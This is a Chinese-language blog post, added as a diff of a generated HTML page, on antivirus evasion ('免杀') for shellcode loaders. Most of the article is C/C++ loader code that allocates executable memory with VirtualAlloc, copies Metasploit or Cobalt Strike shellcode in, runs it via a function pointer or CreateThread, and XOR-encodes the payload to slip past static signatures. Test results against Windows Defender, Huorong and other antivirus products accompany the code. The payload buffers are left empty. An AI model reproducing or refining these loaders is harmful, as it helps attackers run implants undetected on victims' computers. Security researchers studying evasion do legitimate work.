@@ -1,0 +1,628 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>免杀学习-静态恶意代码逃逸 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="免杀学习-静态恶意代码逃逸">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-22 11:14" pubdate>
+        2021年3月22日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      42
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">免杀学习-静态恶意代码逃逸</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月23日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    上次用Python写了一个shellcode加载器后，对免杀有了很大的兴趣，因此想要再多学习一些。</p>
+<h1 id="2-学习"><a href="#2-学习" class="headerlink" title="2.学习"></a>2.学习</h1><p>​    这次主要利用C/C++来实现shellcode的加载，以及基础免杀操作。</p>
+<p>​    木马检测一般分为静态特征查杀、动态行为检测。</p>
+<p>​    静态查杀，其实就是对文件特征码的检测。在各大杀软的病毒库中存储着病毒所具有的独一无二的特征字符，我们称之为特征码。当杀毒软件检测到文件中包含该特征码就会被识别为木马。</p>
+<p>​    随着杀毒软件的升级，特征码的定位已经不仅仅是基于字符串或者正则来实现，现在已经衍生出各种文件扫描技术。比如在文件扫描中忽略像NOP这种无意义的指令，对于文本格式的脚本病毒或宏病毒，则可以替换掉多余的格式字符，例如空格、换行符或制表符等。</p>
+<h2 id="1-基础加载器"><a href="#1-基础加载器" class="headerlink" title="1.基础加载器"></a>1.基础加载器</h2><p>知识点：</p>
+<p>​    1.<code>VirtualAlloc</code>函数用来申请内存;</p>
+<p>​    2.<code>MEM_COMMIT|MEM_RESERVE</code>：MEM_COMMIT—–&gt;为特定的页面区域分配内存中或磁盘的页面文件中的物理存储；MEM_RESERVE：保留进程的虚拟地址空间，而不分配任何物理存储。保留页面可通过继续调用<code>VirtualAlloc()</code>而被占用</p>
+<p>​    3.<code>PAGE_EXECUTE_READWRITE</code>表示申请下来的内存块可读可写可执行。</p>
+<p>​    4.<code>memcpy</code>用来将我们的shellcode复制进申请的内存中。</p>
+<p>​    5.<code>((void(*)())old)();</code>执行申请下来的内存块。</p>
+<p>c++：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//用msf或cs生成的shellcode</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">char</span>* old= (<span class="hljs-keyword">char</span>*)VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(old, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    ((<span class="hljs-keyword">void</span>(*)())old)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>C:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//用msf或cs生成的shellcode</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">char</span>* old= VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(old, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    ((<span class="hljs-keyword">void</span>(*)())old)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/1.png" srcset="/img/loading.gif"></p>
+<p>成功上线，但是这个会被<code>windows 10</code>自带的<code>windows defender</code>给杀掉。</p>
+<h2 id="2-利用Windows-API调用和加载shellcode"><a href="#2-利用Windows-API调用和加载shellcode" class="headerlink" title="2.利用Windows API调用和加载shellcode"></a>2.利用Windows API调用和加载shellcode</h2><blockquote>
+<p>​    Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p>
+<p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p>
+<p>在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p>
+<p>申请方式：</p>
+<ul>
+<li>HeapAlloc</li>
+<li>malloc</li>
+<li>VirtualAlloc</li>
+<li>new</li>
+<li>LocalAlloc</li>
+<li>…</li>
+</ul>
+</blockquote>
+<p>c++：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//可以用msf/cs来获取shellcode</span><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><span class="hljs-comment">// 创建线程</span><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>某杀毒没有查出，但是<code>windows defender</code>和 火绒会杀掉。</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/9.png" srcset="/img/loading.gif"></p>
+<h2 id="3-利用异或运算-内存申请步骤优化"><a href="#3-利用异或运算-内存申请步骤优化" class="headerlink" title="3.利用异或运算+内存申请步骤优化"></a>3.利用异或运算+内存申请步骤优化</h2><p>​    首先用CS或者MSF生成shellcode，然后用脚本将该shellcode进行异或运算转码。</p>
+<h3 id="1-利用-运算符进行异或运算"><a href="#1-利用-运算符进行异或运算" class="headerlink" title="1.利用^运算符进行异或运算"></a>1.利用<code>^</code>运算符进行异或运算</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><br><span class="hljs-comment">/* length: 800 bytes */</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> b = <span class="hljs-keyword">sizeof</span>(buf);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> str[<span class="hljs-number">800</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>   <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; b; i++) &#123;<br>    str[i] = buf[i] ^ a;<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; b; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\\x%x&quot;</span>, str[i]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+<p>​    将以上的脚本的输出结果给到以下<code>buf</code>变量。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><span class="hljs-comment">/* length: 800 bytes */</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    buf[i] ^= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功上线。</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/2.png" srcset="/img/loading.gif"></p>
+<p>*<em>但是简单的异或运算并不能躲避部分安全软件（火</em>）的查杀，但是某杀毒软件并没有查出。**</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/7.png" srcset="/img/loading.gif"></p>
+<p>上线的瞬间就被windows10微软自带的防火墙给杀了。</p>
+<h3 id="2-利用windows的API来进行异或运算"><a href="#2-利用windows的API来进行异或运算" class="headerlink" title="2.利用windows的API来进行异或运算"></a>2.利用windows的API来进行异或运算</h3><p>​     通过调用windows自带的API来进行异或运算，才尝试能否绕过防护。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinBase.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><br><span class="hljs-comment">/* length: 800 bytes */</span><br><br><span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-comment">// 获取shellcode大小</span><br>shellcode_size = <span class="hljs-keyword">sizeof</span>(buf);<br><br><span class="hljs-comment">/* 增加异或代码 */</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;shellcode_size; i++)&#123;<br>    <span class="hljs-comment">//Sleep(50);</span><br>    _InterlockedXor8(buf+i,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">VirtualAlloc(</span><br><span class="hljs-comment">    NULL, // 基址</span><br><span class="hljs-comment">    800,  // 大小</span><br><span class="hljs-comment">    MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">char</span> * shellcode = (<span class="hljs-keyword">char</span> *)VirtualAlloc(<br>    <span class="hljs-literal">NULL</span>,<br>    shellcode_size,<br>    MEM_COMMIT,<br>    PAGE_EXECUTE_READWRITE <span class="hljs-comment">// 只申请可读可写</span><br>    );<br><br>    <span class="hljs-comment">// 将shellcode复制到可读可写的内存页中</span><br>CopyMemory(shellcode,buf,shellcode_size);<br><br>hThread = CreateThread(<br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>    (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>    <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>    &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>WaitForSingleObject(hThread,INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这个方法可以初步绕过<code>windows defender</code>这个微软自带的防火墙：可以上线（之前用Python写的直接被杀），虽然还是有警告，但还是可以执行一段时间的命令。最后还是被杀了</p>
+<p>某安全软件：一开始就被某个安全软件给杀了</p>
+<p><img src="/2021/03/22/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/5.png" srcset="/img/loading.gif"></p>
+<p>但是某杀毒软件并没有查出。</p>
